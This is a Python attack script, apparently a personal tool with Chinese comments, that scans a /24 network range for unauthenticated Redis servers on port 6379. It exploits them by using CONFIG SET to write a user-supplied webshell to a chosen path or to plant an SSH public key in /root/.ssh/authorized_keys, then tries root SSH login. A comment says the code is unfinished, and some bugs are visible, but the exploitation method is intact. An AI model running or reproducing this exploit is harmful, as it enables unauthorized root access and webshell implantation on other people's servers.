#代码有问题，暂时先放着。以后继续修改

import redis
import pexpect
import threading
import argparse
from socket import *


#判断是否有开启6379端口
def Socker_Connect_Port(tarHost,tarPort):
	try:
		setdefaulttimeout(3)
		s = socket(AF_INET,SOCK_STREAM)
		s.connect((tarHost,tarPort))
		print("{}:{} Open".format(tarHost,tarPort))
		s.close()
		return True
	except:
		#print("{}:{} cloed".format(tarHost,tarPort))
		return False


#写文件
def Redis_Write_File(tarHost,tarPort):
	conn = redis.Redis(host=tarHost,port=tarPort)
	path = input("Input write Path: ")
	file_name = input("Input File Name: ")
	webshell = input("Input content: ")
	conn.flushall
	conn.config_set('dir',path)
	conn.config_set('dbfilename',file_name)
	conn.set('webshell',webshell)
	conn.save()

#GetShell、写public_key到对方主机root/.ssh/目录下
def Redis_Write_Public_Key(tarHost,tarPort,public_key):
	conn = redis.Redis(host=tarHost,port=tarPort)
	conn.flushall
	conn.set('crackit',public_key)
	conn.config_set('dir','/root/.ssh')
	conn.config_set('dbfilename','authorized_keys')
	conn.save()


#连接redis并打印信息
def Redis_Connect(tarHost,tarPort):
	try:
		result = Socker_Connect_Port(tarHost,tarPort)
		if result == True:
			red_result = redis.Redis(host=tarHost,port=tarPort)
			result = "\033[1;31;40m {}:{} Connect Seccued \033[0m".format(tarHost, tarPort)
			print(result)
			Write = input("Input webshell or getshell: ")
			if Write == 'webshell':
				Redis_Write_File(tarHost, tarPort)
			elif Write == 'getshell':
				public_key = ''' public key'''
				Redis_Write_Public_Key(tarHost, tarHost, public_key)
			#print(red_result.info())
	except:
		pass

#连接SSh
def SSH_Connect(tarHost,tarPort):
	ssh = pexpect.spawn('ssh root@{username} -p {port}'.format(username=tarHost,port=tarPort))
	i = ssh.expect('[#\$]',timeout=2)
	if i == 0 :
		print("\033[1;34;40m[+]\033[0m Success !")


#C段
def IP_C(tarHost,tarPort):
	for x in range(0,254):
		iplist = '{}.{}'.format(tarHost, x)
		t = threading.Thread(target=Redis_Connect,args=(iplist,tarPort))
		t.start()



def main():
	p = argparse.ArgumentParser(usage='python Redis_Access.py --host 192.168.4 --port 6379',description='python Redis_Access.py --host 192.168.4 --port 6379 --write webshell or getshell')
	p.add_argument('--host',type=str,help='Input IP Address')
	p.add_argument('--port',type=int,default=6379,help='Input Port Default 6379')
	args = p.parse_args()
	tarHost = args.host
	tarPort = args.port
	IP_C(tarHost,tarPort)



if __name__ == '__main__':
    main()